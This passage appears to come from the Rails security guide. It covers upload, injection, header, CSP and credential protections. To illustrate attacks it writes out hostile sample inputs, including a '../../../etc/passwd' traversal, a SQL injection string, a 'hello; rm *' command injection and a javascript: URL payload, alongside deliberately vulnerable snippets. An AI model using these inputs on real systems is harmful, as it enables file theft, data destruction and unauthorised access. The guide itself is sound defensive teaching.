holds. A filename, as with all other kinds of user input should
be sanitized before use.

Active Storage has a
[filename sanitizer](https://api.rubyonrails.org/classes/ActiveStorage/Filename.html#method-i-sanitized)
which it applies to all uploaded files to prevent such attacks.

### Executable Code in File Uploads

Rails applications are usually served through a reverse proxy
powered by a web server such as Nginx or Caddy. The Rails
`/public` folder is often exposed directly through this server
to serve your application's assets efficiently reducing the load
on your Rails application.

Depending on the server's configuration, they may execute code
if a file with a matching extension is requested from a publicly
available directory tree. For example, PHP and CGI files contain
code and might be executed when requested.

If you application stores file uploads in a publicly available
directory, an attacker could upload a malicious file called
`virus.cgi`, and when it's requested, your web server will execute
it instead of returning it to the client.

To prevent these attacks, never store uploaded files in a publicly
available folder and ensure your server is configured to prevent
arbitrary code execution.

Always sanitize the name and type of uploaded files. Active Storage
handles this automatically.

### File Downloads

Unsanitized user input to create file downloads can allow a malicious
user to access secure files from your server. The
[`send_file`](https://api.rubyonrails.org/classes/ActionController/DataStreaming.html#method-i-send_file)
method can be user to trigger file downloads. The below snippet
shows an example of a download with unsanitized input:

```ruby
send_file("/var/www/uploads/" + params[:filename])
```

An attacker could pass a value like `../../../etc/passwd` to
the `filename` param to download the server's login information.
Sanitizing the file name supplied by the user is the simplest
way to prevent this attack.

A more robust solution is to store the user facing file names
in the database and renaming uploaded files to a random string
or ID which is also tracked in the database.

Active Storage uses this approach to prevent such attacks.

### Media Processing of File Uploads

Active Storage uses the `ffmpeg` utility to generate video previews,
and `ffprobe` to extract video and audio metadata. Neither tool is
shipped by Rails and are external binaries installed on the Rails
server.

A stock build of these tools includes several hundred decoders and
demuxers but a Rails application likely only uses a handful of these.
Blobs are analyzed on upload by default, so these tools may automatically
read malicious bytes uploaded by an attacker.

Both `ffmpeg` and `ffprobe` decode untrusted media in memory-unsafe
code. Narrow the attack surface by restricting the codecs and
formats they will accept.

For example, an application that accepts only
H.264 video with AAC audio would configure:

```ruby
# config/production.rb

config.active_storage.video_preview_input_arguments = "-codec_whitelist h264,aac"
config.active_storage.ffprobe_arguments = "-codec_whitelist h264,aac"
```

Alongside `-codec_whitelist`, `-f` forces a single demuxer
and `-protocol_whitelist` restricts the protocols an input may
reference.

Every codec present in a supported files must appear in the list,
including audio codecs. `ffprobe` exits with an error on a file that
uses any other codec, and analysis of that file then raises
`JSON::ParserError`. Codec names vary between `ffmpeg` builds, so
check the list against `ffmpeg -decoders` for the build you deploy.

Log Filtering
-------------

Rails logs all requests by default, and these may contain sensitive
data such as login credentials, authentication tokens, or credit
card numbers. If an attacker were to get access to these logs,
they'd have all this user data in plain text. Rails has a
[`filter_parameters`](configuring.html#config-filter-parameters)
configuration option which is used to mask sensitive information:

```ruby
# config/initializers/filter_parameter_logging.rb

# Be sure to restart your server when you modify this file.

# Configure parameters to be partially matched (e.g. passw matches password) and filtered from the log file.
# Use this to limit dissemination of sensitive information.
# See the ActiveSupport::ParameterFilter documentation for supported notations and behaviors.
Rails.app.config.filter_parameters += [
  :passw, :email, :secret, :token, :_key, :crypt, :salt, :certificate, :otp, :ssn, :cvv, :cvc
]
```

Matching parameters will be excluded from the logs and replaced
with `[FILTERED]`. They will also be hidden when called `inspect`
on an Active Record object so sensitive data is protected when
sending traces to monitoring tools.

Injection
---------

Injection is a class of attacks where an attacker crafts a malicious
input with the intent of injecting it into application code to
steal, manipulate, destroy, or otherwise cause damage to user data.

### Allowlists and Denylists

Allowlists and denylists can be used to sanitize user input to
ensure they don't contain anything malicious. Always prefer
allowlists as this defines a narrow set of permitted inputs.
A denylist would have to cover every possible input except what's
expected which is not usually feasible to maintain.

An example of using an allowlist is to maintain a list of tags
allowed in user input such as `<strong>`, `<p>`, rather than a
list of disallowed tags.

Don't correct user input by removing strings that appear in a
denylist. Reject the input entirely. For example, if you disallow
`<script>` tags in user input, attempting to remove it could be
bypassed using the string: `<sc<script>ript>`.
`"<sc<script>ript>".gsub("<script>", "")` will result in
an intact `<script>` tag.

Rails provides a number of [sanitizers](https://api.rubyonrails.org/classes/ActionView/Helpers/SanitizeHelper.html)
for user input.

### SQL Injection

An attacker executes a SQL injection attack by crafting a malicious
input which the target application will inject into a SQL query.
The input will transform the resultant query into something
entirely different. This attack can be used to modify, read,
or delete arbitrary data.

Consider following Active Record query to search for a project:

```ruby
@project = Project.where("name = '#{params[:name]}'")
```

An attacker may specify the `:name` parameter as `' OR 1) --`.
This will result in the following SQL query:

```sql
SELECT * FROM projects WHERE (name = '' OR 1) --')
```

Using this technique, the attacker will be able to see all the
projects in the database, completely bypassing any authorization
checks.

Rails and Active Record have several countermeasures built-in to
guard against such attacks. Always use the Active Record Query
DSL where possible. The above query can be rewritten as:

```ruby
# This syntax guards against SQL injection attacks by sanitizing the input
@project = Project.where(name: params[:name]})
```

If you must write raw SQL statements or statement fragments,
always sanitize user input and structure your query to send the
arguments separately from the rest of the SQL statement.

```ruby
# Using positional placeholders to pass arguments
Project.where("name = ? AND due_date >= ?", params[:name], params[:due_date])

# Using named placeholders to pass arguments
values = { name: params[:name], due_date: params[:due_date] }
Project.where("name = :name AND due_date >= :due_date", values)
```

Rails provides a [`sanitize_sql`][] you can use to sanitize SQL
queries when using lower levels query APIs such
as [`ActiveRecord::Base.connection.execute`](https://api.rubyonrails.org/classes/ActiveRecord/ConnectionAdapters/DatabaseStatements.html#method-i-execute)
or [`Model.find_by_sql`](https://api.rubyonrails.org/classes/ActiveRecord/Querying.html#method-i-find_by_sql).
Using this sanitizer, you can safely execute queries including
user input.

The key consideration here is that unsanitized user input should
**NEVER** be interpolated into a SQL query. Always be mindful of
the risk of injecting user input into executable code, even
after sanitization.

[`sanitize_sql`]: https://api.rubyonrails.org/classes/ActiveRecord/Sanitization/ClassMethods.html#method-i-sanitize_sql

### Command Line Injection

If your application executes shell commands in the underlying
operating system based on user input, ensure that the user cannot
inject a malicious command. The below snippet demonstrates an attack
where the input terminates the initial command and tacks on a
malicious command after it.

```ruby
user_input = "hello; rm *"
system("/bin/echo #{user_input}")
# prints "hello", and deletes files in the current directory
```

Pass the parameters to the method separately to prevent such an attack.

```ruby
system("/bin/echo", "hello; rm *")
# prints "hello; rm *" and does not delete files
```

#### Kernel#open

`Kernel#open` executes an OS command if the argument starts with
a vertical bar (`|`).

```ruby
open("| ls") { |file| file.read }
# returns file list as a String via `ls` command
```

Interpolating a user-supplied string into a command passed to `open`
could allow an attacker to run commands on your server.

Never pass user input to this method. Use a safer and more specific
method such as `File.open`, `IO.open`, or `URI#open` instead.

```ruby
File.open("| ls") { |file| file.read }
# doesn't execute `ls` command, just opens `| ls` file if it exists

IO.open(0) { |file| file.read }
# opens stdin. doesn't accept a String as the argument

require "open-uri"
URI("https://example.com").open { |file| file.read }
# opens the URI. `URI()` doesn't accept `| ls`
```

Always sanitize inputs when using it in potentially dangerous
operations as demonstrated above. A good rule of thumb is to
assume that all data input by the user is insecure until proven
otherwise.

DNS Rebinding Attacks
---------------------

[DNS rebinding](https://en.wikipedia.org/wiki/DNS_rebinding) is
a method of manipulating resolution of domain names to subvert
the [same-origin policy](https://en.wikipedia.org/wiki/Same-origin_policy).

Use the `ActionDispatch::HostAuthorization` middleware to guard
against DNS rebinding and other Host header attacks. It's enabled
by default in the development environment, you have to activate
it in production and other environments by defining a list of
allowed hosts.

```ruby
# Only requests made to product.com will be served. If an attacker
# rebinds my-malicious-domain.example.com to your server's
# IP address, the requests will trigger the `response_app` below.
Rails.app.config.hosts << "product.com"

# Configure additional options for host checking
Rails.app.config.host_authorization = {
  # Exclude requests for the /healthcheck/ path from host checking
  exclude: ->(request) { request.path.include?("healthcheck") },
  # Add custom Rack application for the response
  response_app: -> env do
    [400, { "Content-Type" => "text/plain" }, ["Bad Request"]]
  end
}
```

You can read more about the `ActionDispatch::HostAuthorization`
middleware in the [configuration guide](/configuring.html#actiondispatch-hostauthorization).

Regular Expressions
-------------------

Ruby handles regular expressions slightly differently than other
languages. `^` and `$` match the start and end of the string
respectively in most languages — however, in Ruby, they match
the start and end of a **line**. `\A` and `\z` are used to match
the ends of a string in Ruby.

Consider the below regular expression as an example. It's intended
to validate a URL.

```ruby
/^https?:\/\/[^\n]+$/i
```

Since Ruby matches the start of a line with `^`, and the end
with `$`, the below string will pass validation:

```
javascript:exploit_code();/*
http://hi.com
*/
```

If this user supplied URL is rendered in the UI, it can be used
as an attack vector to hide malicious code behind a link. Always
use `\A` and `\z` to match the start and end of a string:

```ruby
/\Ahttps?:\/\/[^\n]+\z/i
```

In this particular case, a more secure validation technique is
to create a `URI` object:

```ruby
begin
  uri = URI(params[:url])
rescue URI::InvalidURIError
  # Handle invalid URI
end
```

The Active Record format validator raises an exception if the
provided regular expression uses `^` or `$`:

```ruby
# This will raise an error when instantiating the object
validates :content, format: { with: /^Meanwhile$/ }
```

Set `multiline:` to true if you absolutely need to use these anchors:

```ruby
validates :content, format: { with: /^Meanwhile$/, multiline: true }
```

Always ensure your regular expressions are well tested.

Default HTTP Headers
--------------------

Rails is configured by default to return a number of HTTP
headers for every request:

```ruby
Rails.app.config.action_dispatch.default_headers
=>
{"X-Frame-Options" => "SAMEORIGIN",
 "X-XSS-Protection" => "0",
 "X-Content-Type-Options" => "nosniff",
 "X-Permitted-Cross-Domain-Policies" => "none",
 "Referrer-Policy" => "strict-origin-when-cross-origin"}
```

You can modify the default headers using this configuration option:

```ruby
# config/initializers/default_headers.rb

Rails.app.config.action_dispatch.default_headers.tap do |headers|
  # Change the value of a header
  headers["X-Frame-Options"] = "DENY"

  # Add a custom default header
  headers["X-App-Version"] = "2.0"

  # Remove a default header
  headers.delete("Referrer-Policy")
end
```

### `X-Frame-Options`

The [`X-Frame-Options`][] header controls whether a browser can render
the page in a `<frame>`, `<iframe>`, `<embed>` or `<object>` tag. The
default value is `SAMEORIGIN` which allow framing on the same domain
only. Set it to `DENY` to deny framing at all, or remove this header
completely if you want to allow framing on all domains.

[`X-Frame-Options`]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options

### `X-Content-Type-Options`

The [`X-Content-Type-Options`][] header tells the browser that the
MIME types advertised in the `Content-Type` header must be respected
and not guessed. The default value is `nosniff`.

[`X-Content-Type-Options`]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options

### `X-Permitted-Cross-Domain-Policies`

[`X-Permitted-Cross-Domain-Policies`] controls whether web clients
such as Adobe Acrobat or Microsoft Silverlight can access your page
on other domains. It's set to `none` by default.

[`X-Permitted-Cross-Domain-Policies`]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/X-Permitted-Cross-Domain-Policies

### `Referrer-Policy`

The [`Referrer-Policy`][] header controls how much information is
included in the `Referer` header. The default value
is `strict-origin-when-cross-origin`.

[`Referrer-Policy`]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy

Additional HTTP Security Headers
--------------------------------

### `Strict-Transport-Security` Header

The HTTP [`Strict-Transport-Security` (HSTS)][] response header
tells the browser to upgrade the connection to HTTPS for the current
and all future requests.

Enable the `force_ssl` option to send this header automatically:

```ruby
config.force_ssl = true
```

[`Strict-Transport-Security` (HSTS)]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security

### `Content-Security-Policy` Header

A [`Content-Security-Policy` (CSP)][] header explicitly defines
the sources of external content such as images, fonts, scripts,
and styles that can be loaded onto your web page. It's designed to
protect your application from XSS attacks.

Rails provides a DSL to configure the CSP header:

```ruby
# config/initializers/content_security_policy.rb

Rails.app.config.content_security_policy do |policy|
  policy.default_src :self, :https
  policy.font_src    :self, :https, :data
  policy.img_src     :self, :https, :data
  policy.object_src  :none
  policy.script_src  :self, :https
  policy.style_src   :self, :https
  # Specify URI for violation reports
  policy.report_uri "/csp-violation-report-endpoint"
end
```

You can override the CSP for specific controllers:

```ruby
class PostsController < ApplicationController
  content_security_policy do |policy|
    policy.upgrade_insecure_requests true
    policy.base_uri "https://www.example.com"
  end
end
```

or disable it entirely for a given controller or action:

```ruby
class LegacyPagesController < ApplicationController
  content_security_policy false, only: :index
end
```

Use lambdas to dynamically inject values — such as subdomains in
a multi-tenant application:

```ruby
class PostsController < ApplicationController
  content_security_policy do |policy|
    policy.base_uri :self, -> { "https://#{current_user.domain}.example.com" }
  end
end
```

[`Content-Security-Policy` (CSP)]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy

#### Monitoring CSP Violations

Supply a [`report-uri`][] to collect CSP violation reports from
the browser:

```ruby
# config/initializers/content_security_policy.rb

Rails.app.config.content_security_policy do |policy|
  # ...

  policy.report_uri "/csp-violation-report-endpoint"
end
```

INFO: [`report-uri`][] is deprecated, but still widely supported
across browsers. It's replacement is
[`report_to`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/report-to)
which is not currently supported in Rails.

You'll need to implement the monitoring endpoint yourself.
A reference implementation is shown below:

```ruby
# config/routes.rb

post "/csp-violation-report-endpoint", to: "csp_violation_reports#create"

# app/controllers/csp_violation_reports_controller.rb

class CspViolationReportsController < ApplicationController
  skip_forgery_protection

  def create
    parsed_body = JSON.parse(request.body.read)
    violation_report = parsed_body["csp-report"] || parsed_body

    # Save the violation report to the database for inspection ...

    head :no_content
  end
end
```

WARNING: `/csp-violation-report-endpoint` is a publicly available
POST endpoint which means it can be abused. Ensure you have adequate
protections such as rate-limiting and request validation in place.
Specific techniques are out of scope for this guide. Further
information about CSP violation reports can be found in the
[MDN docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/report-uri).

#### Adding a CSP to Legacy Content

When migrating legacy content to be CSP compliant, you might want to
report violations without enforcing the policy until the content can
be upgraded.

Set the [`Content-Security-Policy-Report-Only`][] response header to
only report violations:

```ruby
# config/initializers/content_security_policy.rb

Rails.app.config.content_security_policy_report_only = true

# ...
```

Or set it for specific controllers:

```ruby
class PostsController < ApplicationController
  content_security_policy_report_only only: :index
end
```

This way, you can monitor and fix violations before enforcing
the policy.

[`Content-Security-Policy-Report-Only`]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy-Report-Only
[`report-uri`]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-uri

#### Adding a Nonce

When using a CSP, you need to enable inline `<script>` or `<style>`
tags using `:unsafe_inline`, otherwise they will not be executed.
As the name suggests, this is unsafe. Using
a [_nonce_](https://developer.mozilla.org/en-US/docs/Glossary/Nonce),
`<script>` or `<style>` tags can be safely allowlisted for execution.

```ruby
# config/initializers/content_security_policy.rb

Rails.app.config.content_security_policy do |policy|
  # Only allow scripts from the same domain over HTTPS
  policy.script_src :self, :https
end

# Create a nonce generator
Rails.app.config.content_security_policy_nonce_generator = -> request { SecureRandom.base64(16) }
```

`SecureRandom.base64(16)` will securely generate a new nonce for
each request. However, the trade-off here is that it is incompatible
with [conditional GET caching](caching_with_rails.html#conditional-get-support)
because new nonces will result in new ETag values for every request.
An alternative would be to use the session ID:

```ruby
Rails.app.config.content_security_policy_nonce_generator = -> request { request.session.id.to_s }
```

This generation method is compatible with ETags, however its security
depends on the session ID being sufficiently random and not being exposed
in insecure cookies.

By default, nonces will be applied to `script-src` and `style-src`
if a nonce generator is defined.

You can explicitly specify the directives which use nonces using:

```ruby
Rails.app.config.content_security_policy_nonce_directives = %w(script-src)
```

Once nonce generation is configured in an initializer, add the
nonce to your script tags using:

```html+erb
<%= javascript_tag nonce: true do -%>
  alert('Hello, World!');
<% end -%>
```

The same works with `javascript_include_tag` and the
`stylesheet_link_tag`:

```html+erb
<%= javascript_include_tag "script", nonce: true %>
<%= stylesheet_link_tag "style.css", nonce: true %>
```

Automatically add nonces to `javascript_tag`, `javascript_include_tag`,
and `stylesheet_link_tag` using:

```ruby
Rails.app.config.content_security_policy_nonce_auto = true
```

WARNING: If your nonce is generated per request, it may lead to
cache fragmentation or stale content if your caching strategy doesn't
account for dynamic nonces.

Use [`csp_meta_tag`](https://api.rubyonrails.org/classes/ActionView/Helpers/CspHelper.html#method-i-csp_meta_tag)
to create a `<meta>` tag named "csp-nonce" with the per-session
nonce value for allowing inline `<script>` tags. It can be used
to dynamically add scripts to a page.

```html+erb
<head>
  <%= csp_meta_tag %>
</head>
```

Bear in mind that if your nonce is available in a meta tag, it can
just as easily by used by an attacker who has achieved XSS to inject
their own script with a valid nonce into your page. Use this technique
with extreme caution.

### `Feature-Policy` Header

The [`Feature-Policy`](https://http.dev/feature-policy) header allows
us to enable or disable certain browser APIs for a specific origin.

This header is currently deprecated and replaced by
[`Permissions-Policy`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Permissions-Policy).
This is a new specification and isn't widely supported. For
future-proofing, Rails uses `permissions_policy` for this API, but
the underlying HTTP header it generates is `Feature-Policy`.

You can define your feature policy using
[a DSL](https://api.rubyonrails.org/classes/ActionDispatch/PermissionsPolicy.html):

```ruby
# config/initializers/permissions_policy.rb
Rails.app.config.permissions_policy do |policy|
  policy.camera      :none
  policy.gyroscope   :none
  policy.microphone  :none
  policy.usb         :none
  policy.fullscreen  :self
  policy.payment     :self, "https://secure.example.com"
end
```

The policy can be overridden for specific controllers:

```ruby
class PagesController < ApplicationController
  permissions_policy do |policy|
    policy.geolocation "https://example.com"
  end
end
```

### Cross-Origin Resource Sharing

[Cross-Origin Resource Sharing (CORS)](https://en.wikipedia.org/wiki/Cross-origin_resource_sharing)
is a mechanism which allows a web page to safely access resources
on a different domain.

Browsers restrict JavaScript initiated requests to other domains.
If the reponse doesn't contain the appropriate
`Access-Control-Allow-Origin` header, the response will not be
readable.

In some cases, a browser may initiate a
[pre-flight request](https://developer.mozilla.org/en-US/docs/Glossary/Preflight_request)
to verify CORS permissions before making the specidied HTTP request.
In other cases, the specified request will be initiated and fulfilled
by the destination server, but the browser will block the response
from being read without an appropriate CORS header.

When running Rails as an API only and your frontend app runs on a
different domain, you'll need to enable CORS.

The [Rack CORS](https://github.com/cyu/rack-cors) gem can be used for this.

```shell
$ bundle add rack-cors
```

Add an initializer to configure the middleware:

```ruby
# config/initializers/cors.rb
Rails.app.config.middleware.insert_before 0, Rack::Cors do
  allow do
    origins "example.com"

    resource "*",
      headers: :any,
      methods: [:get, :post, :put, :patch, :delete, :options, :head]
  end
end
```

JavaScript requests from `example.com` will now return readable responses.

Securing Application Credentials
--------------------------------

Rails provides tools that can help store your application's secrets
securely. Providing specific advice on keeping your secrets secure is
out of scope for this guide as deployment environments and pipelines
can vary significantly. In this section, we will discuss the Rails
features for storing sensitive information such as tokens and other
credentials.

### Encrypted Credentials File

Rails generates an encrypted `config/credentials.yml.enc` file with
all new applications. Development and Test environment secrets can
be stored securely in this file and it can also be checked into source
control as it's encrypted.

The value in `config/master.key` is used to encrypt and decrypt the
credentials file. **Never** commit the master key into source control.

TIP: The master key can also be stored in an environment variable called `RAILS_MASTER_KEY`.

Do not use this file to store production credentials. Create a
new production-specific credentials file. See the
[Storing Production Credentials](#storing-production-credentials) section
below for details.

The credentials file contains the application's `secret_key_base`
which is used to generate the keys for `ActiveSupport::MessageVerifier`
and `ActiveSupport::MessageEncryptor`. You can also store your own
secrets such as API tokens for external services.

Edit the credentials using:

```shell
$ bin/rails credentials:edit
# If the credentials file or master key doesn't exist,
# this command will create them.
```

NOTE: The above command requires a `VISUAL` or `EDITOR` environment
variable with the command to launch a text editor. It uses this command
to open your text editor with the decrypted file. For example, you'd
launch Visual Studio Code
using: `EDITOR="code --wait" bin/rails credentials:edit`. Consult your
chosen text editor's documentation for further information.

View the contents of the credentials file in your terminal using:

```shell
$ bin/rails credentials:show
```

The secrets file in credentials file are structured in YAML format,
and can be accessed in your application using `Rails.app.credentials`.

```yaml
# config/credentials.yml.enc (decrypted)
secret_key_base: 3b7cd72...
some_api_key: SOMEKEY
system:
  access_key_id: 1234AB
```

```ruby
Rails.app.credentials.some_api_key
# => "SOMEKEY"

Rails.app.credentials.system.access_key_id
# => "1234AB"
```

Use the bang operator to raise an exception if a key doesn't exist

```ruby
Rails.app.credentials.unknown_key!
# => :unknown_key is blank (KeyError)
```

To do a combined lookup in your credentials file as well as the
environment, use:

```ruby
# ENV.fetch("SOME_API_KEY") || Rails.app.credentials.some_api_key!
Rails.app.creds.require(:some_api_key)

# ENV.fetch("SYSTEM__ACCESS_KEY_ID") || Rails.app.credentials.system.access_key_id!
Rails.app.creds.require(:system, :access_key_id)

# ENV.fetch("SOME_API_KEY") || Rails.app.credentials.some_api_key
Rails.app.creds.option(:some_api_key)

# ENV.fetch("SYSTEM__ACCESS_KEY_ID") || Rails.app.credentials.system.access_key_id
Rails.app.creds.option(:system, :access_key_id)
```

Run `bin/rails credentials:help` for further information about credentials.

### Rotating the `secret_key_base`

You can rotate your application's `secret_key_base` without immediately
invalidating messages generated with the old secret. First, replace
`secret_key_base` with a new random value and make the old value available
separately, for example as `old_secret_key_base` in your credentials. Then add
the old value as a fallback before any message verifiers are created:

```ruby
# config/application.rb

config.before_initialize do |app|
  app.message_verifiers.rotate(
    secret_key_base: app.credentials.old_secret_key_base
  )
end
```

New messages are generated using the new `secret_key_base`, while application
message verifiers can still verify messages generated with the old one. This
includes framework features backed by `Rails.application.message_verifiers`,
such as signed IDs and Active Storage.

WARNING: Do not retain an exposed secret as a fallback. If the old value
may be compromised, replace it immediately and allow existing
messages and cookies to become invalid.

### Storing Production Credentials

Never use the same credentials file for both development and
production. Create a new production-specific credentials file using:

```bash
$ bin/rails credentials:edit --environment production
```

This will create:

* `config/credentials/production.key`
* `config/credentials/production.yml.enc`

`production.key` contains the key used to encrypt and decrypt
`production.yml.enc`. This is your master key for the production
environment. Just like the development master key (`config/master.key`),
never check this into source control.

On your hosting provider or production server, set the environment
variable `RAILS_MASTER_KEY` to the value in `production.key` so
Rails can decrypt production credentials.

Rails will generate a new production-specific `secret_key_base`
in `production.yml.enc` by default. You can place other production
secrets such as external API tokens and SMTP server details in this
file.

In the production environment, the production credentials are accessed
using the exact same syntax as the development secrets so you don't
need to make any code changes to use the production credentials file.

WARNING: Keep your master keys safe. **DO NOT** commit your master
keys into source control.

Dependency Management
---------------------

The Rails team may sometimes bump dependencies to address security
issues. Use `bundle update --conservative gem_name` to update
vulnerable dependencies to the minimum required version. This way,
developers are not forced to upgrade to the latest version of a
depedency to pull in security fixes, and can upgrade on their own
timeline.

[`bundler-audit`] can help you detect vulnerable dependencies and
provide solutions. Generate a report by running:

```bash
$ bundle-audit
```

Rails also now includes the [`brakeman`](https://brakemanscanner.org) gem
by default which statically analyzes your codebase to detect vulnerabilities.
It will flag [unmaintained dependencies](https://brakemanscanner.org/docs/warning_types/unmaintained_dependency/)
so you can prepare a migration plan to replace them.

Additional Resources
--------------------

Always remember that security is a constantly moving target. Ensure you
develop strategies catering for the worst-case scenarios. Never assume
that an attacker will never be able to compromise a secret, or access
a server or database. Assume the worst and develop defensive strategies
to avoid losing control of your system.

The security landscape shifts and it is important to keep up to date
to avoid missing critical security updates. Subscribe to the
[Rails Security mailing list](https://discuss.rubyonrails.org/c/security-announcements/9)
to receive updates about known vulnerabilities and fixes.

These are some additional resources for web application security:

* [Mozilla's Web Security Guidelines](https://infosec.mozilla.org/guidelines/web_security.html) - Recommendations on topics covering Content Security Policy, HTTP headers, Cookies, TLS configuration, etc.
* A [good set of security resources](https://owasp.org/), notably the [Cheat Sheet Series](https://cheatsheetseries.owasp.org/index.html), with for example the [Cross-Site Scripting Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).
